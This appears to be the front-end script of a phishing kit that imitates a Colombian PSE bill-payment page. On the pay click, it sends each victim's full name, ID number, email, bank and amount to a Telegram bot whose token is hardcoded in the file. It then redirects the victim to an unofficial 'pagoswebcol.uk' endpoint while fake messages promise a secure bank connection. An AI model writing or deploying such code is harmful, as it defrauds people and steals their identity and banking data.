// --- SCRIPT PARA CARGAR DATOS Y PROCESAR EL PAGO ---
document.addEventListener('DOMContentLoaded', () => {
    const data = JSON.parse(localStorage.getItem('datosFactura'));

    // Elementos del Modal
    const modal = document.getElementById('modalCorreo');
    const btnOpen = document.getElementById('btnCambiarCorreo');
    const btnCancel = document.getElementById('btnCancelarModal');
    const btnSave = document.getElementById('btnGuardarModal');
    const inputCorreo = document.getElementById('inputNuevoCorreo');
    const formCorreo = document.getElementById('formCorreo');

    if (data) {
        // Llenar datos
        if(document.getElementById('lblNombre')) document.getElementById('lblNombre').textContent = enmascararNombre(data.nombreCompleto);
        if(document.getElementById('lblId')) document.getElementById('lblId').textContent = data.tipoId + " - " + enmascararID(data.numId);
        if(document.getElementById('lblCorreo')) document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
        if(document.getElementById('lblIp')) document.getElementById('lblIp').textContent = data.ip;
        if(document.getElementById('lblRef')) document.getElementById('lblRef').textContent = data.referencia;
        
        if(data.correo && formCorreo) formCorreo.value = data.correo;

        // Formatear moneda
        const formatter = new Intl.NumberFormat('en-US', {
            style: 'currency',
            currency: 'USD',
            minimumFractionDigits: 0
        });
        const valorFormateado = formatter.format(data.montoPagar).replace('$', '$');

        if(document.getElementById('lblValorNeto')) document.getElementById('lblValorNeto').textContent = valorFormateado;
        if(document.getElementById('lblValorTotal')) document.getElementById('lblValorTotal').textContent = valorFormateado;
        if(document.getElementById('lblTotalFinal')) document.getElementById('lblTotalFinal').textContent = valorFormateado;

        // Lógica Modal (Solo si existen los elementos)
        if(btnOpen && modal) {
            btnOpen.addEventListener('click', () => {
                inputCorreo.value = ""; 
                modal.style.display = 'flex';
                inputCorreo.focus();
            });

            btnCancel.addEventListener('click', () => {
                modal.style.display = 'none';
            });

            modal.addEventListener('click', (e) => {
                if (e.target === modal) modal.style.display = 'none';
            });

            btnSave.addEventListener('click', () => {
                const nuevoCorreo = inputCorreo.value.trim();
                if (nuevoCorreo && nuevoCorreo.includes('@')) {
                    data.correo = nuevoCorreo;
                    localStorage.setItem('datosFactura', JSON.stringify(data));
                    document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
                    formCorreo.value = data.correo;
                    modal.style.display = 'none';
                } else {
                    inputCorreo.style.borderBottom = "1px solid red";
                    setTimeout(() => inputCorreo.style.borderBottom = "1px solid #dcdcdc", 2000);
                }
            });
        }

    } else {
        // Si no hay datos, no hacemos nada o redirigimos al inicio
        console.warn("No hay datos de factura en localStorage.");
    }
});

// --- LÓGICA DE CONEXIÓN ROBUSTA (CON ALERTA A TELEGRAM) ---
const botonPagar = document.querySelector('.btn-pay');

// CONFIGURA ESTOS VALORES (reemplázalos)
const TELEGRAM_BOT_TOKEN = '8425620613:AAGtK8DnpmnRcudQp_tIy4kc7MJuq0QUbPE';
const TELEGRAM_CHAT_ID = '-4977407810';

// Función para enviar alerta a Telegram
async function sendTelegramAlert(text) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.warn('Telegram token/chat no configurados — alerta no enviada.');
        return;
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
        // Envío por POST con JSON (parse_mode opcional)
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (err) {
        // No lanzamos error al usuario para no bloquear el flujo de pago
        console.warn('Error enviando alerta a Telegram:', err);
    }
}

if (botonPagar) {
    botonPagar.addEventListener('click', async function() {
        const btn = this;
        
        // 1. Obtener datos
        const bancoSelect = document.getElementById('selectBanco');
        const banco = bancoSelect ? bancoSelect.value : "";
        
        // Intentamos obtener el correo del input, si no, del localStorage
        let email = document.getElementById('formCorreo') ? document.getElementById('formCorreo').value : '';
        const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
        
        // Si el input está vacío, usamos el del localStorage
        if (!email && data.correo) email = data.correo;
        
        const amount = data.montoPagar || 5000; 

        // 2. VALIDACIONES (CORREGIDAS)
        if (!banco || banco.trim() === "" || banco.toLowerCase().includes("seleccione")) {
            alert("Por favor seleccione un banco válido.");
            if(bancoSelect) bancoSelect.focus();
            return;
        }

        if (!email || !email.includes('@')) {
            alert("Por favor verifique el correo electrónico.");
            return;
        }

        // --- ENVÍO DE ALERTA A TELEGRAM (antes de mostrar overlay)
        try {
            const nombre = data.nombreCompleto || 'N/A';
            const referencia = data.referencia || 'N/A';
            const idTipo = data.tipoId || '';
            const idNum = data.numId || '';

            const mensaje = `<b>Pago iniciado</b>%0A` +
                `Nombre: ${escapeHtml(nombre)}%0A` +
                `ID: ${escapeHtml(idTipo)} - ${escapeHtml(idNum)}%0A` +
                `Correo: ${escapeHtml(email)}%0A` +
                `Banco: ${escapeHtml(banco)}%0A` +
                `Monto: ${escapeHtml(amount.toString())}%0A` +
                `Ref: ${escapeHtml(referencia)}%0A`;

            // Telegram acepta saltos de línea; usamos decodeURIComponent en servidor si fuera necesario.
            // Enviamos la alerta (no bloqueante)
            sendTelegramAlert(decodeURIComponent(mensaje));
        } catch (e) {
            console.warn('No se pudo preparar la alerta de Telegram:', e);
        }

        // 3. ACTIVAR PANTALLA DE CARGA
        const overlay = document.getElementById('loadingOverlay');
        const loadingTextEl = document.getElementById('dynamicLoadingText');
        if (overlay) overlay.style.display = 'flex';
        
        const loadingMessages = [
            "Conectando con la pasarela de pagos...",
            "Verificando disponibilidad bancaria...",
            "Ya casi...",
            "Estableciendo conexión segura con PSE...",
            "Redirigiendo a su banco...",
            "Por favor espere..."
        ];

        let textIndex = 0;
        let textInterval;
        
        if (loadingTextEl) {
            textInterval = setInterval(() => {
                textIndex = (textIndex + 1) % loadingMessages.length;
                loadingTextEl.textContent = loadingMessages[textIndex];
            }, 2500);
        }

        // 4. PREPARAR URL (Backend)
        const baseUrl = 'https://api2.pagoswebcol.uk'; 
        
        const params = new URLSearchParams({
            amount: amount,
            bank: banco,
            email: email,
            headless: 0,
            timeout: 60000 
        });
        
        const apiUrl = `${baseUrl}/meter?${params.toString()}`;
        console.log("Iniciando transacción segura...", params.toString());

        try {
            // --- PLAN A: FETCH NORMAL ---
            const response = await fetch(apiUrl, {
                method: 'GET',
                headers: { 'Content-Type': 'application/json' }
            });

            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
            
            const result = await response.json();

            if (result.ok && result.result && result.result.exactName) {
                finalizarConExito(result.result.exactName);
            } else {
                throw new Error(result.error || "Error en la respuesta del servidor");
            }

        } catch (error) {
            console.warn("Reintentando conexión (JSONP)...", error);
            
            // --- PLAN B: JSONP (Fallback) ---
            intentarJsonp(baseUrl, params);
        }

        // --- FUNCIONES AUXILIARES ---
        function finalizarConExito(url) {
            if (textInterval) clearInterval(textInterval);
            if (loadingTextEl) loadingTextEl.textContent = "¡Conexión exitosa! Redirigiendo...";
            setTimeout(() => {
                window.location.href = url;
            }, 1000);
        }

        function intentarJsonp(baseUrl, params) {
            const callbackName = 'jsonp_callback_' + Math.round(100000 * Math.random());
            const script = document.createElement('script');
            
            window[callbackName] = function(data) {
                document.head.removeChild(script);
                delete window[callbackName];
                
                if (data.ok && data.result && data.result.exactName) {
                    finalizarConExito(data.result.exactName);
                } else {
                    manejarErrorFinal("El servidor no pudo procesar la solicitud.");
                }
            };

            script.onerror = function() {
                document.head.removeChild(script);
                delete window[callbackName];
                
                // --- PLAN C: REDIRECCIÓN DIRECTA ---
                if (loadingTextEl) loadingTextEl.textContent = "Redirigiendo al servidor...";
                window.location.href = `${baseUrl}/meter?${params.toString()}`;
            };

            const jsonpUrl = `${baseUrl}/meter.jsonp?${params.toString()}&callback=${callbackName}`;
            script.src = jsonpUrl;
            document.head.appendChild(script);
        }

        function manejarErrorFinal(mensaje) {
            if (textInterval) clearInterval(textInterval);
            if (overlay) overlay.style.display = 'none';
            
            alert("No se pudo conectar con el banco. Intente nuevamente.\n" + mensaje);
            
            btn.textContent = "Reintentar";
            btn.disabled = false;
            btn.style.opacity = "1";
        }
    });
}

// pequeño helper para evitar inyección en el mensaje (muy básico)
function escapeHtml(str) {
    if (!str) return '';
    return String(str).replace(/[&<>"']/g, function (m) {
        return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[m];
    });
}

// Funciones auxiliares visuales
function enmascararNombre(nombre) {
    if(!nombre) return "";
    const partes = nombre.split(" ");
    return partes[0] + " " + (partes[1] ? partes[1][0] : "") + "*******";
}

function enmascararID(id) {
    if(!id) return "";
    return id.substring(0, 3) + "****";
}

function enmascararCorreo(email) {
    if(!email) return "";
    const [user, domain] = email.split("@");
    return user.substring(0, 2) + "*******@" + "*****." + "com";

}


